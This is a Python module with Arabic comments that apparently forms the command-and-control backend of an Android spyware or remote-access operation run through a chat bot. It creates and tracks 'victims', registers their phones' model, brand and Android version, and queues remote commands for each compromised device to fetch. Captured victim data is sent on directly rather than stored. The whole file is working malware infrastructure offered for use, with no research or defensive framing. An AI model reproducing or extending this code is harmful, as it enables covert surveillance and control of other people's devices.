# victims_manager.py
# ============================================================
# نظام إدارة الضحايا — v8
# إرسال فوري — لا تخزين في Redis
# ============================================================

import json
import time
import uuid
import secrets

from logging_config import get_logger
from monitoring import metrics
from crypto_utils import encrypt_data, decrypt_data

logger = get_logger("victims_manager")

# ★★★ استخدام Redis من config فقط ★★★
try:
    from config import redis_client, REDIS_URL, MASTER_CRYPTO_KEY
    logger.info("Victims Manager: Using shared Redis")
except Exception as e:
    logger.error(f"Victims Manager: config failed - {e}")
    redis_client = None
    MASTER_CRYPTO_KEY = None


# ============================================================
# Encryption Helpers
# ============================================================
def _encrypt_victim_fields(data):
    """تشفير حقول الضحية الحساسة"""
    if not MASTER_CRYPTO_KEY:
        return data
    
    fields_to_encrypt = ["name", "device_id", "model", "brand", "android", "sdk"]
    for field in fields_to_encrypt:
        if field in data and data[field]:
            data[field] = encrypt_data(data[field], MASTER_CRYPTO_KEY)
    return data

def _decrypt_victim_fields(data):
    """فك تشفير حقول الضحية"""
    if not data or not MASTER_CRYPTO_KEY:
        return data
    
    fields_to_encrypt = ["name", "device_id", "model", "brand", "android", "sdk"]
    for field in fields_to_encrypt:
        if field in data and data[field]:
            data[field] = decrypt_data(data[field], MASTER_CRYPTO_KEY)
    return data


# ============================================================
# Helpers
# ============================================================
def _victims_set(chat_id):
    return f"victims:{chat_id}"


def _victim_hash(chat_id, victim_id):
    return f"victim:{chat_id}:{victim_id}"


def _token_map(victim_token):
    return f"victim_token:{victim_token}"


def _cmd_queue(victim_id):
    return f"victim_cmd:{victim_id}"


# ============================================================
# إنشاء ضحية
# ============================================================
def create_victim(chat_id, name, site="general"):
    """إنشاء ضحية جديدة"""
    if not redis_client:
        logger.error("create_victim: No Redis")
        return None

    try:
        victim_id = uuid.uuid4().hex[:12]
        victim_token = secrets.token_urlsafe(24)
        now = time.time()

        victim_data = {
            "victim_id": victim_id,
            "victim_token": victim_token,
            "chat_id": str(chat_id),
            "name": name[:40],
            "site": site,
            "device_id": "",
            "model": "",
            "brand": "",
            "android": "",
            "sdk": "",
            "status": "pending",
            "created_at": str(now),
            "last_seen": "",
            "first_connection": "",
            "permissions_status": "unknown",
        }

        # تشفير البيانات قبل الحفظ
        storage_data = _encrypt_victim_fields(victim_data.copy())

        # ★ pipeline لتقليل العمليات
        pipe = redis_client.pipeline()
        pipe.hset(_victim_hash(chat_id, victim_id), mapping=storage_data)
        pipe.expire(_victim_hash(chat_id, victim_id), 86400 * 30)
        pipe.sadd(_victims_set(chat_id), victim_id)
        pipe.expire(_victims_set(chat_id), 86400 * 30)
        pipe.setex(
            _token_map(victim_token),
            86400 * 30,
            json.dumps({"chat_id": str(chat_id), "victim_id": victim_id})
        )
        pipe.execute()

        logger.info(f"Victim created: {name} | {victim_id}")
        metrics.inc_counter("victims_created")

        return victim_data

    except Exception as e:
        logger.exception(f"create_victim error: {e}")
        return None


def get_victim(chat_id, victim_id):
    """جلب ضحية واحدة"""
    if not redis_client:
        return None
    try:
        data = redis_client.hgetall(_victim_hash(chat_id, victim_id))
        if not data:
            return None
        return _decrypt_victim_fields(data)
    except Exception as e:
        logger.warning(f"get_victim error: {e}")
        return None


def get_all_victims(chat_id):
    """جلب كل الضحايا"""
    if not redis_client:
        return []

    try:
        vids = redis_client.smembers(_victims_set(chat_id))
        if not vids:
            return []

        victims = []
        pipe = redis_client.pipeline()
        for vid in vids:
            pipe.hgetall(_victim_hash(chat_id, vid))
        results = pipe.execute()

        for v in results:
            if v:
                victims.append(_decrypt_victim_fields(v))

        victims.sort(
            key=lambda x: float(x.get("last_seen") or x.get("created_at") or 0),
            reverse=True
        )
        return victims

    except Exception as e:
        logger.error(f"get_all_victims error: {e}")
        return []


def find_victim_by_token(victim_token):
    """البحث عن ضحية بالتوكن"""
    if not redis_client:
        return None

    try:
        raw = redis_client.get(_token_map(victim_token))
        if not raw:
            return None

        info = json.loads(raw)
        chat_id = info["chat_id"]
        victim_id = info["victim_id"]

        v = get_victim(chat_id, victim_id)
        if v:
            v["chat_id"] = chat_id
            v["victim_id"] = victim_id
        return v

    except Exception as e:
        logger.warning(f"find_victim_by_token error: {e}")
        return None


def register_victim_device(chat_id, victim_id, device_id, info=None):
    """تسجيل جهاز ضحية"""
    if not redis_client:
        return False

    try:
        now = time.time()
        updates = {
            "device_id": device_id,
            "status": "active",
            "last_seen": str(now),
        }

        # أول اتصال
        if not redis_client.hget(_victim_hash(chat_id, victim_id), "first_connection"):
            updates["first_connection"] = str(now)

        if info:
            if info.get("model"):
                updates["model"] = info["model"]
            if info.get("brand"):
                updates["brand"] = info["brand"]
            if info.get("android"):
                updates["android"] = info["android"]
            if info.get("sdk"):
                updates["sdk"] = str(info["sdk"])

        # تشفير التحديثات
        storage_updates = _encrypt_victim_fields(updates.copy())
        redis_client.hset(_victim_hash(chat_id, victim_id), mapping=storage_updates)
        metrics.inc_counter("victims_registered")
        return True

    except Exception as e:
        logger.error(f"register_victim_device error: {e}")
        return False


# ============================================================
# أوامر الضحية
# ============================================================
def queue_victim_command(victim_id, action, **kwargs):
    """إضافة أمر لقائمة انتظار ضحية"""
    if not redis_client:
        return False

    try:
        cmd = {"action": action, "id": uuid.uuid4().hex[:8]}
        cmd.update(kwargs)

        queue_key = _cmd_queue(victim_id)
        pipe = redis_client.pipeline()
        pipe.lpush(queue_key, json.dumps(cmd))
        pipe.expire(queue_key, 600)
        pipe.execute()

        logger.info(f"CMD queued: {action} → {victim_id[:8]}")
        metrics.inc_counter("commands_queued", tags={"action": action})
        return True

    except Exception as e:
        logger.error(f"queue_victim_command error: {e}")
        return False


def pop_victim_commands(victim_id, max_count=10):
    """سحب أوامر ضحية"""
    if not redis_client:
        return []

    try:
        commands = []
        queue_key = _cmd_queue(victim_id)

        pipe = redis_client.pipeline()
        for _ in range(max_count):
            pipe.rpop(queue_key)
        results = pipe.execute()

        for item in results:
            if item:
                try:
                    commands.append(json.loads(item))
                except json.JSONDecodeError as e:
                    logger.warning(f"parse command error: {e}")

        return commands

    except Exception as e:
        logger.error(f"pop_victim_commands error: {e}")
        return []


def has_victim_commands(victim_id):
    """★ تحقق سريع — بدون سحب"""
    if not redis_client:
        return False
    try:
        return redis_client.llen(_cmd_queue(victim_id)) > 0
    except Exception as e:
        logger.debug(f"has_victim_commands error: {e}")
        return False


# ============================================================
# ★★★ لا تخزين — الإرسال مباشر ★★★
# ============================================================
def add_victim_data(victim_id, data):
    """لا تخزين — الإرسال مباشر من api_victim"""
    return True


def get_victim_data(victim_id, limit=50):
    """لا يوجد بيانات مخزنة"""
    return []


# ============================================================
# إدارة الضحايا
# ============================================================
def update_victim_status(chat_id, victim_id, status):
    """تحديث حالة ضحية"""
    if not redis_client:
        return False

    try:
        redis_client.hset(
            _victim_hash(chat_id, victim_id),
            mapping={
                "status": status,
                "last_seen": str(time.time())
            }
        )
        return True
    except Exception as e:
        logger.warning(f"update_victim_status error: {e}")
        return False


def rename_victim(chat_id, victim_id, new_name):
    """تغيير اسم ضحية"""
    if not redis_client:
        return False

    try:
        encrypted_name = encrypt_data(new_name[:40], MASTER_CRYPTO_KEY)
        redis_client.hset(
            _victim_hash(chat_id, victim_id),
            "name",
            encrypted_name
        )
        return True
    except Exception as e:
        logger.warning(f"rename_victim error: {e}")
        return False


def delete_victim(chat_id, victim_id):
    """حذف ضحية نهائياً"""
    if not redis_client:
        return False

    try:
        v = get_victim(chat_id, victim_id)

        pipe = redis_client.pipeline()

        if v and v.get("victim_token"):
            pipe.delete(_token_map(v["victim_token"]))

        pipe.delete(_victim_hash(chat_id, victim_id))
        pipe.srem(_victims_set(chat_id), victim_id)
        pipe.delete(_cmd_queue(victim_id))
        pipe.execute()

        logger.info(f"Victim deleted: {victim_id}")
        return True

    except Exception as e:
        logger.exception(f"delete_victim error: {e}")
        return False


def get_victim_stats(chat_id):
    """إحصائيات ضحايا"""
    victims = get_all_victims(chat_id)

    stats = {"total": len(victims), "active": 0, "pending": 0}
    for v in victims:
        if v.get("status") == "active":
            stats["active"] += 1
        else:
            stats["pending"] += 1

    return stats
